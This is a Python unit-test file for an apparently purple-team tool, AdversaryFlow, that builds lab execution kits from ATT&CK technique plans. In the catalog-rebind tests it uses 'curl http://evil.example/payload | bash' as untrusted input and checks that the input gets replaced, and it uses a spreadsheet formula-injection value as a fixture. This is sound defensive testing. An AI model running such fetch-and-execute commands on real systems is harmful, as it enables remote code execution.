import csv
import hashlib
import io
import json
import os
import shutil
import subprocess
import tempfile
import unittest
import zipfile
from pathlib import Path

from backend.command_catalog import get_commands
from backend.execution_kit import (
    EXERCISE_RUNNER_NAME,
    ExecutionKitError,
    archive_execution_kit,
    build_execution_kit,
    normalize_plan,
    rebind_to_catalog,
    render_plan_csv,
)


def plan_fixture(platform="linux", *, duplicate=False, command="printf 'hello from AdversaryFlow\\n'", cleanup=""):
    command_record = {
        "platform": platform,
        "command": command,
        "note": "Fixture command",
        "cleanup": cleanup,
        "risk": "low",
        "side_effects": ["read_only_or_process_telemetry"],
        "requires_admin": False,
        "requires_network": False,
        "network_targets": [],
        "prerequisites": [f"{platform} command environment", "authorized disposable lab"],
        "expected_telemetry": "Process and command-line telemetry.",
        "expected_output": "A fixture greeting.",
        "timeout_seconds": 10,
        "rollback": "",
        "cleanup_required": False,
        "acknowledgment_required": False,
    }
    technique = {
        "id": "T1059.001" if platform == "windows" else "T1059.004",
        "name": "PowerShell" if platform == "windows" else "Unix Shell",
        "url": "https://attack.mitre.org/techniques/T1059/004/",
        "platforms": [platform.title()],
        "command_source": "curated",
        "supported": True,
        "command": command_record,
        "run": False,
        "execution": {"outcome": "not_run"},
    }
    stages = [{"tactic": "execution", "title": "Execution", "techniques": [technique]}]
    if duplicate:
        stages.append({"tactic": "persistence", "title": "Persistence", "techniques": [technique]})
    return {
        "schema_version": "2.0",
        "tool": "AdversaryFlow",
        "tool_version": "0.3.0",
        "data_version": "enterprise:bundle--fixture",
        "domains": ["enterprise"],
        "generated": "2026-09-05T12:00:00Z",
        "actor": {
            "stix_id": "intrusion-set--fixture",
            "attack_id": "G0001",
            "name": "Fixture Actor",
            "type": "group",
            "aliases": [],
            "description": "Fixture",
            "technique_count": 1,
        },
        "scope": {
            "command_platform": platform,
            "include_pre": True,
            "curated_only": False,
            "allow_network": False,
            "allow_admin": False,
            "allow_high_risk": False,
            "stages": [stage["tactic"] for stage in stages],
        },
        "execution_context": {"operator": "Purple Team", "target": "lab-host-01"},
        "summary": {
            "techniques": 1,
            "runnable": 1,
            "unsupported": 0,
            "stages": len(stages),
            "curated": 1,
            "fallback": 0,
            "marked_run": [],
        },
        "stages": stages,
    }


class ExecutionPlanTests(unittest.TestCase):
    def test_duplicate_techniques_receive_distinct_occurrence_ids(self):
        plan = normalize_plan(plan_fixture(duplicate=True))
        self.assertEqual(len(plan.steps), 2)
        self.assertNotEqual(plan.steps[0].step_id, plan.steps[1].step_id)
        self.assertEqual([step.sequence for step in plan.steps], [1, 2])

    def test_macos_plans_generate_a_bash_execution_kit(self):
        plan = normalize_plan(plan_fixture("macos"))
        self.assertEqual(plan.platform, "macos")
        payload, filename = archive_execution_kit(plan)
        self.assertIn("macOS", filename)
        with zipfile.ZipFile(io.BytesIO(payload)) as archive:
            names = archive.namelist()
        self.assertTrue(any(name.endswith("-execute.sh") for name in names))

    def test_posix_runner_is_portable_to_macos(self):
        from backend.execution_kit import render_bash
        script = render_bash(normalize_plan(plan_fixture("macos")), "plan.csv", "abc")
        self.assertIn("shasum", script)
        self.assertIn("macOS", script)
        self.assertIn('"macos"', script)

    def test_exact_platform_command_is_required(self):
        document = plan_fixture("linux")
        document["stages"][0]["techniques"][0]["command"]["platform"] = "windows"
        with self.assertRaisesRegex(ExecutionKitError, "exact linux"):
            normalize_plan(document)

    def test_missing_fidelity_defaults_to_direct(self):
        plan = normalize_plan(plan_fixture("linux"))
        self.assertEqual(plan.steps[0].fidelity, "direct")

    def test_security_booleans_cannot_be_smuggled_as_strings(self):
        document = plan_fixture("linux")
        document["stages"][0]["techniques"][0]["command"]["requires_admin"] = "false"
        with self.assertRaisesRegex(ExecutionKitError, "must be true or false"):
            normalize_plan(document)

    def test_csv_is_excel_compatible_and_formula_safe(self):
        document = plan_fixture(command="=DANGEROUS()")
        plan = normalize_plan(document)
        content = render_plan_csv(plan)
        self.assertTrue(content.startswith(b"\xef\xbb\xbf"))
        rows = list(csv.DictReader(io.StringIO(content.decode("utf-8-sig"))))
        self.assertEqual(rows[0]["step_id"], "0001-execution-t1059.004")
        self.assertEqual(rows[0]["planned_command"], "'=DANGEROUS()")
        self.assertEqual(rows[0]["planned_command_sha256"], hashlib.sha256(b"=DANGEROUS()").hexdigest())


class ExecutionKitArchiveTests(unittest.TestCase):
    def extract(self, platform):
        archive_bytes, filename = build_execution_kit(plan_fixture(platform))
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
            names = archive.namelist()
            archive.extractall(directory.name)
            modes = {entry.filename: entry.external_attr >> 16 for entry in archive.infolist()}
        return Path(directory.name), filename, names, modes

    def test_linux_archive_contains_only_the_handoff_pair(self):
        root, filename, names, modes = self.extract("linux")
        self.assertTrue(filename.endswith("_Linux.zip"))
        self.assertEqual(len(names), 2)
        self.assertTrue(any(name.endswith("-plan.csv") for name in names))
        script_name = next(name for name in names if name.endswith("-execute.sh"))
        self.assertEqual(modes[script_name] & 0o111, 0o111)
        self.assertTrue((root / script_name).is_file())
        script = (root / script_name).read_text(encoding="utf-8")
        self.assertNotIn("eval ", script)
        self.assertNotIn("jq ", script)
        self.assertNotIn("python", script.lower())

    def test_windows_runner_uses_only_builtin_powershell_facilities(self):
        root, filename, names, _modes = self.extract("windows")
        self.assertTrue(filename.endswith("_Windows.zip"))
        script = (root / next(name for name in names if name.endswith("-execute.ps1"))).read_text(encoding="utf-8")
        self.assertIn("#requires -Version 5.1", script)
        self.assertIn("ConvertTo-Json", script)
        self.assertIn("Get-FileHash", script)
        self.assertIn("R=run / E=edit / S=skip / A=abort", script)
        self.assertNotIn("Invoke-Expression", script)
        self.assertNotIn("adversaryflow-telemetry", script)
        self.assertNotIn(" ? ", script)

    @unittest.skipUnless(shutil.which("pwsh"), "PowerShell is unavailable")
    def test_windows_runner_parses_and_completes_a_fixture_session(self):
        archive_bytes, _filename = archive_execution_kit(normalize_plan(
            plan_fixture("windows", command="Write-Output 'hello from AdversaryFlow'")))
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
            archive.extractall(directory.name)
        script_path = next(Path(directory.name).rglob("*-execute.ps1"))
        parser_path = str(script_path).replace("'", "''")
        parser = subprocess.run(
            [
                "pwsh", "-NoProfile", "-Command",
                f"$tokens=$null;$errors=$null;[Management.Automation.Language.Parser]::ParseFile('{parser_path}',[ref]$tokens,[ref]$errors)>$null;if($errors.Count){{$errors|ForEach-Object{{Write-Error $_}};exit 1}}",
            ],
            capture_output=True, text=True, check=False, timeout=20,
        )
        self.assertEqual(parser.returncode, 0, parser.stderr)
        result = subprocess.run(
            ["pwsh", "-NoProfile", "-File", str(script_path)],
            input="\n\nY\nR\nY\nN\n",
            capture_output=True, text=True, check=False, timeout=30,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        evidence = next(script_path.parent.glob("AdversaryFlow-results-*"))
        summary = json.loads((evidence / "execution-summary.json").read_text(encoding="utf-8-sig"))
        schema = json.loads(Path("schemas/adversaryflow-execution.schema.json").read_text(encoding="utf-8"))
        self.assertEqual(set(summary), set(schema["required"]))
        self.assertEqual(summary["status"], "completed")
        self.assertEqual(summary["completed_steps"], 1)

    @unittest.skipIf(os.name == "nt", "Bash runner smoke test runs on POSIX CI hosts")
    def test_linux_runner_executes_offline_and_writes_complete_evidence(self):
        archive_bytes, _filename = archive_execution_kit(normalize_plan(plan_fixture("linux")))
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
            names = archive.namelist()
            archive.extractall(directory.name)
        root = Path(directory.name)
        script_path = root / next(name for name in names if name.endswith("-execute.sh"))
        syntax = subprocess.run(["bash", "-n", str(script_path)], capture_output=True, text=True, check=False)
        self.assertEqual(syntax.returncode, 0, syntax.stderr)
        result = subprocess.run(
            ["bash", str(script_path)],
            input="\n\nY\nR\nY\nN\n",
            capture_output=True,
            text=True,
            check=False,
            timeout=30,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        result_dirs = list(script_path.parent.glob("AdversaryFlow-results-*"))
        self.assertEqual(len(result_dirs), 1)
        evidence = result_dirs[0]
        for name in ("execution-report.html", "execution-report.md", "execution-results.csv", "execution-summary.json", "evidence-events.jsonl", "SHA256SUMS"):
            self.assertTrue((evidence / name).is_file(), name)
        summary = json.loads((evidence / "execution-summary.json").read_text(encoding="utf-8"))
        schema = json.loads(Path("schemas/adversaryflow-execution.schema.json").read_text(encoding="utf-8"))
        self.assertEqual(set(summary), set(schema["required"]))
        self.assertEqual(summary["status"], "completed")
        self.assertEqual(summary["completed_steps"], 1)
        report = (evidence / "execution-report.md").read_text(encoding="utf-8")
        self.assertIn("Fixture Actor", report)
        self.assertIn("Detection assessment:** passed", report)
        self.assertEqual(len(list((evidence / "stdout").glob("*.log"))), 1)

    @unittest.skipIf(os.name == "nt", "Bash runner integrity test runs on POSIX CI hosts")
    def test_runner_refuses_a_changed_csv(self):
        root, _filename, names, _modes = self.extract("linux")
        script_path = root / next(name for name in names if name.endswith("-execute.sh"))
        csv_path = root / next(name for name in names if name.endswith("-plan.csv"))
        csv_path.write_text("changed", encoding="utf-8")
        result = subprocess.run(["bash", str(script_path)], capture_output=True, text=True, check=False, timeout=10)
        self.assertEqual(result.returncode, 2)
        self.assertIn("integrity check failed", result.stderr)

    @unittest.skipIf(os.name == "nt", "Bash edit workflow runs on POSIX CI hosts")
    def test_linux_runner_audits_an_edit_and_cleanup(self):
        archive_bytes, _filename = archive_execution_kit(normalize_plan(plan_fixture(
            "linux",
            command="printf 'original\\n'",
            cleanup="printf 'cleanup complete\\n'",
        )))
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
            archive.extractall(directory.name)
        script_path = next(Path(directory.name).rglob("*-execute.sh"))
        editor = Path(directory.name) / "fixture-editor.sh"
        editor.write_text("#!/bin/sh\nprintf \"printf 'edited command\\\\n'\\n\" > \"$1\"\n", encoding="utf-8")
        editor.chmod(0o755)
        result = subprocess.run(
            ["bash", str(script_path)],
            input="\n\nY\nE\nLab path adjustment\nR\nY\nY\nN\n",
            env={**os.environ, "EDITOR": str(editor)},
            capture_output=True,
            text=True,
            check=False,
            timeout=30,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        evidence = next(script_path.parent.glob("AdversaryFlow-results-*"))
        with (evidence / "execution-results.csv").open(encoding="utf-8") as stream:
            rows = list(csv.DictReader(stream))
        self.assertEqual(rows[0]["modified"], "true")
        self.assertEqual(rows[0]["modification_reason"], "Lab path adjustment")
        self.assertEqual(rows[0]["cleanup_status"], "completed")
        original = next((evidence / "commands").glob("*.original.sh")).read_text(encoding="utf-8")
        effective = next((evidence / "commands").glob("*.executed.sh")).read_text(encoding="utf-8")
        self.assertNotEqual(original, effective)


class CatalogRebindTests(unittest.TestCase):
    def test_client_command_text_is_replaced_with_the_catalog_record(self):
        document = plan_fixture("linux", command="curl http://evil.example/payload | bash")
        rebound = rebind_to_catalog(document)
        catalog = get_commands("T1059.004", "Unix Shell", ["execution"])["commands"]
        linux = next(item for item in catalog if item["platform"] == "linux")
        self.assertEqual(rebound["stages"][0]["techniques"][0]["command"]["command"], linux["command"])
        self.assertNotIn("evil.example", rebound["stages"][0]["techniques"][0]["command"]["command"])
        archive_bytes, _filename = build_execution_kit(document)
        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
            csv_name = next(name for name in archive.namelist() if name.endswith("-plan.csv"))
            rows = list(csv.DictReader(io.StringIO(archive.read(csv_name).decode("utf-8-sig"))))
        self.assertEqual(rows[0]["planned_command"], linux["command"])
        self.assertNotIn("evil.example", rows[0]["planned_command"])
        self.assertTrue(archive_bytes)

    def test_a_wrong_platform_in_the_client_payload_is_corrected(self):
        document = plan_fixture("linux")
        document["stages"][0]["techniques"][0]["command"]["platform"] = "windows"
        document["stages"][0]["techniques"][0]["command"]["command"] = "whoami"
        rebound = rebind_to_catalog(document)
        self.assertEqual(rebound["stages"][0]["techniques"][0]["command"]["platform"], "linux")
        self.assertTrue(rebound["stages"][0]["techniques"][0]["supported"])
        normalize_plan(rebound)

    def test_bounded_exercises_are_bundled_and_invoked_from_the_kit(self):
        document = plan_fixture("linux")
        document["scope"]["allow_network"] = True
        document["stages"][0]["techniques"][0]["id"] = "T1110"
        document["stages"][0]["techniques"][0]["name"] = "Brute Force"
        document["stages"][0]["techniques"][0]["command"]["command"] = "curl http://evil.example/T1110"
        archive_bytes, _filename = build_execution_kit(document)
        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
            names = [Path(name).name for name in archive.namelist()]
            self.assertIn(EXERCISE_RUNNER_NAME, names)
            self.assertEqual(archive.read(next(n for n in archive.namelist() if n.endswith(EXERCISE_RUNNER_NAME))),
                             Path("backend/lab_exercises.py").read_bytes())
            csv_name = next(name for name in archive.namelist() if name.endswith("-plan.csv"))
            rows = list(csv.DictReader(io.StringIO(archive.read(csv_name).decode("utf-8-sig"))))
        self.assertEqual(rows[0]["planned_command"], f"python3 ./{EXERCISE_RUNNER_NAME} T1110")
        self.assertEqual(rows[0]["fidelity"], "bounded_synthetic")
        self.assertNotIn("evil.example", rows[0]["planned_command"])

    def test_direct_plans_do_not_ship_the_exercise_runner(self):
        archive_bytes, _filename = build_execution_kit(plan_fixture("linux"))
        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
            names = [Path(name).name for name in archive.namelist()]
        self.assertNotIn(EXERCISE_RUNNER_NAME, names)
        self.assertEqual(len(names), 2)

    def test_scope_still_withholds_high_risk_catalog_commands(self):
        document = plan_fixture("windows")
        document["scope"]["allow_high_risk"] = False
        document["stages"][0]["techniques"][0]["id"] = "T1053.005"
        document["stages"][0]["techniques"][0]["name"] = "Scheduled Task"
        rebound = rebind_to_catalog(document)
        command = rebound["stages"][0]["techniques"][0]["command"]
        self.assertTrue(command["unsupported"])
        self.assertIn("high-risk", command["command"])
        with self.assertRaisesRegex(ExecutionKitError, "no executable"):
            build_execution_kit(document)


if __name__ == "__main__":
    unittest.main()
